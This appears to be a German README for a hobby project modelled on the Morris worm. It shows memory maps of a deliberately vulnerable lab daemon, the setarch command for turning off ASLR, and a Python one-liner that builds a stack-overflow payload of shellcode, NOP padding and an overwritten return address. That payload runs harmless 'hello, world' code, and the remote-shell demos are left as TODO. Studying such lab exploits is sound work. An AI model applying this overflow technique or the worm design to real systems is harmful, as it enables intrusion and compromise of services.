## Desgin
angelehnt an den [Morris-Wurm]()


## Sonstiges

Damit so ein einfacher Stackoverflow-Angriff auf modernen Systemen überhaupt noch funktioniert muss man erstens ASLR (zumindest für den Daemon) ausschalten und den Daemon ohne Stack Cannaries (`-fno-stack-protector`) und mit ausführbarem Stack (`-z execstack`) bauen.

Ausführen ohne ASLR: `setarch $(uname -m) -R bash`

Stack nicht ausführbar:
```
$ ./memmap.py 456
ADDRESS RANGE                    	  RSS /  SIZE	PERM	NAME
0000555555554000-0000555555555000	   4K /    4K	r-xp	victimd
0000555555754000-0000555555755000	   4K /    4K	r--p	victimd
0000555555755000-0000555555756000	   4K /    4K	rw-p	victimd
0000555555756000-0000555555777000	   4K /  132K	rw-p	[heap]
00007ffff7a3a000-00007ffff7bcf000	 912K /    1M	r-xp	libc-2.24.so
00007ffff7bcf000-00007ffff7dcf000	    0 /    2M	---p	libc-2.24.so
00007ffff7dcf000-00007ffff7dd3000	  16K /   16K	r--p	libc-2.24.so
00007ffff7dd3000-00007ffff7dd5000	   8K /    8K	rw-p	libc-2.24.so
00007ffff7dd5000-00007ffff7dd9000	   8K /   16K	rw-p	[anon]
00007ffff7dd9000-00007ffff7dfc000	 140K /  140K	r-xp	ld-2.24.so
00007ffff7fed000-00007ffff7fef000	   8K /    8K	rw-p	[anon]
00007ffff7ff8000-00007ffff7ffa000	    0 /    8K	r--p	[vvar]
00007ffff7ffa000-00007ffff7ffc000	   4K /    8K	r-xp	[vdso]
00007ffff7ffc000-00007ffff7ffd000	   4K /    4K	r--p	ld-2.24.so
00007ffff7ffd000-00007ffff7ffe000	   4K /    4K	rw-p	ld-2.24.so
00007ffff7ffe000-00007ffff7fff000	   4K /    4K	rw-p	[anon]
00007ffffffde000-00007ffffffff000	   8K /  132K	rw-p	[stack]
ffffffffff600000-ffffffffff601000	    0 /    4K	r-xp	[vsyscall]
```

Stack ausführbar:
```
 ./memmap.py 489
ADDRESS RANGE                    	  RSS /  SIZE	PERM	NAME
0000555555554000-0000555555555000	   4K /    4K	r-xp	victimd
0000555555754000-0000555555755000	   4K /    4K	r-xp	victimd
0000555555755000-0000555555756000	   4K /    4K	rwxp	victimd
0000555555756000-0000555555777000	   4K /  132K	rwxp	[heap]
00007ffff7a3a000-00007ffff7bcf000	 912K /    1M	r-xp	libc-2.24.so
00007ffff7bcf000-00007ffff7dcf000	    0 /    2M	---p	libc-2.24.so
00007ffff7dcf000-00007ffff7dd3000	  16K /   16K	r-xp	libc-2.24.so
00007ffff7dd3000-00007ffff7dd5000	   8K /    8K	rwxp	libc-2.24.so
00007ffff7dd5000-00007ffff7dd9000	   8K /   16K	rwxp	[anon]
00007ffff7dd9000-00007ffff7dfc000	 140K /  140K	r-xp	ld-2.24.so
00007ffff7fed000-00007ffff7fef000	   8K /    8K	rwxp	[anon]
00007ffff7ff8000-00007ffff7ffa000	    0 /    8K	r--p	[vvar]
00007ffff7ffa000-00007ffff7ffc000	   4K /    8K	r-xp	[vdso]
00007ffff7ffc000-00007ffff7ffd000	   4K /    4K	r-xp	ld-2.24.so
00007ffff7ffd000-00007ffff7ffe000	   4K /    4K	rwxp	ld-2.24.so
00007ffff7ffe000-00007ffff7fff000	   4K /    4K	rwxp	[anon]
00007ffffffde000-00007ffffffff000	   8K /  132K	rwxp	[stack]
ffffffffff600000-ffffffffff601000	    0 /    4K	r-xp	[vsyscall]
```


## Demo einfacher Exploit
```
consti@debian: ~/Programmieren/Wurm $ python3 -c 'import struct, sys; code = open(sys.argv[1], "rb").read(); sys.stdout.buffer.write(b"........" + code + b"\x90" * (int(sys.argv[2]) - len(code)) + struct.pack("<Q", int(sys.argv[3], 16) + 8) + b"\n")' hello.bin 64 0x7fffffffea00 | ./victimd
calling fgets() with wrong buffer size
leaving main()
hello, worldconsti@debian: ~/Programmieren/Wurm $ echo $?
99
```


## Demo Remote Shell mit fixer Stack-Adresse
TODO


## Demo Remote Shell mit `JMP RSP`
TODO


## Links
* https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx
* https://reverseengineering.stackexchange.com/questions/16706/what-causes-the-need-for-nop-sleds
* https://security.stackexchange.com/questions/157478/why-jmp-esp-instead-of-directly-jumping-into-the-stack